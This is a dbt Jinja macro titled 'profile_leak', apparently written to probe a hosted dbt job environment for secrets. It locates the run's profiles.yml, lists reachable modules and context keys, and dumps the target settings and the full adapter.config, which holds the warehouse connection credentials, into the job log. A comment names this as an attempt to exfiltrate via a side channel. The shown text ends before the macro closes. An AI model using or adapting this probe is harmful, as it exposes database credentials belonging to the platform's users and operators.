{% macro profile_leak() %}
  {# Try reading profiles.yml via Python modules available in Jinja2 #}
  {% set path = "/tmp/jobs/" ~ env_var("DBT_RUN_ID", "unknown") ~ "/.dbt/profiles.yml" %}
  {{ log("PROFILE_PATH=" ~ path, info=True) }}
  
  {# modules.datetime and modules.pytz are available — check if modules has io or os #}
  {% set mod_keys = modules | string %}
  {{ log("MODULES=" ~ mod_keys, info=True) }}
  
  {# Try builtins to see what's accessible #}
  {% set ctx_keys = context | list %}
  {{ log("CTX_KEYS=" ~ ctx_keys | join(","), info=True) }}
  
  {# Try using run_query to exfil via side-channel if execute is true #}
  {% if execute %}
    {{ log("EXECUTE_TRUE", info=True) }}
  {% endif %}
  
  {# Dump target info #}
  {{ log("TARGET=" ~ target | string, info=True) }}
  {{ log("TARGET_NAME=" ~ target.name, info=True) }}
  {{ log("TARGET_SCHEMA=" ~ target.schema, info=True) }}
  {{ log("TARGET_DATABASE=" ~ target.database, info=True) }}
  {{ log("TARGET_TYPE=" ~ target.type, info=True) }}
  
  {# The adapter.config contains everything #}
  {% set cfg = adapter.config %}
  {{ log("CONFIG_KEYS=" ~ cfg | string, info=True) }}
